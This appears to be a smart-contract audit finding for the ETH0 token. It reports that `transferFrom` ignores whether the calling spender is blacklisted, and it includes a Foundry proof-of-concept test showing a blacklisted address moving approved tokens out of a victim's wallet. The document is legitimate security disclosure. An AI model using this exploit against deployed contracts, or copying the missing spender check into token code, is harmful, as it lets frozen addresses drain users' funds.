# Blacklisted addresses can still move others’ ETH0 via `transferFrom`

### Summary

A missing `msg.sender` blacklist check in `Eth0.transferFrom(...)` allows a blacklisted spender to pull tokens from any approved wallet. As a result, an address that has been blacklisted (and should be frozen) can still move ETH0 from victims’ accounts, bypassing the intended blacklist safeguard.

### Root Cause

In [`Eth0.sol`](https://github.com/sherlock-audit/2025-05-usual-eth0/blob/main/eth0-protocol/src/token/Eth0.sol#L1), `transferFrom(address sender, address recipient, uint256 amount)` simply calls:

```solidity
return super.transferFrom(sender, recipient, amount);
```

OpenZeppelin’s `transferFrom` only invokes the `_update(from, to, amount)` hook, which checks that **`sender`** and **`recipient`** are not blacklisted—but it does not check whether **`msg.sender`** (the spender) is blacklisted. Thus, a blacklisted spender can still initiate a transferFrom as long as the victim’s allowance was set previously.


### Internal Pre-conditions

1. **Victim** calls `eth0.approve(spender, allowanceAmount)` → sets an allowance for `spender`.
2. **Admin** then blacklists `spender` via `eth0.blacklist(spender)`, so `isBlacklisted[spender] == true`.
3. `spender` still holds the `allowanceAmount` from `victim`.


### External Pre-conditions

### Attack Path


1. Victim grants a one-time allowance to `BadSpender`:
2. Admin blacklists `BadSpender`:
3. Despite being blacklisted, `BadSpender` calls:
   ```solidity
   vm.prank(badSpender);
   eth0.transferFrom(victim, attacker, 50e18);
   ```
4. Inside OZ’s `super.transferFrom`, `_update(from= victim, to= attacker, amount)` checks only `isBlacklisted[victim]` and `isBlacklisted[attacker]`. Since neither is blacklisted, the transfer succeeds.
5. Victim’s 50 ETH0 is drained into `attacker`’s account.


### Impact

* Any blacklisted address can still “pull” ETH0 from any victim who previously set an allowance.
* Victims lose funds despite having blacklisted the spender.
* Undermines the intended “no transfers, no burns” policy for blacklisted addresses—effectively nullifying blacklisting for ERC-20 allowances.


### PoC

```solidity
    function testBlacklistedSpenderCanStillTransferFrom() public {
        address badSpender = address(0xB2);
        address victim    = address(0xC3);
        address attacker    = address(0xD4);
        // Mint 100 ETH0 to victim:
        vm.prank(address(registryContract.getContract(CONTRACT_DAO_COLLATERAL)));
        eth0Token.mint(victim, 100e18);

        // Victim approves badSpender for 50 ETH0:
        vm.prank(victim);
        eth0Token.approve(badSpender, 50e18);

        // Admin blacklists badSpender:
        vm.prank(blacklistOperator);
        eth0Token.blacklist(badSpender);

        // Confirm badSpender is blacklisted:
        assertTrue(eth0Token.isBlacklisted(badSpender));

        // badSpender calls transferFrom despite being blacklisted:
        vm.prank(badSpender);
        eth0Token.transferFrom(victim, attacker, 50e18);

        // Attacker now holds the 50 ETH0 drained from victim:
        assertEq(eth0Token.balanceOf(attacker), 50e18);

        // Victim lost 50 ETH0 even though badSpender was blacklisted:
        assertEq(eth0Token.balanceOf(victim), 50e18);
    }
```

### Mitigation

Insert an explicit blacklist check for `msg.sender` at the top of `transferFrom(...)`
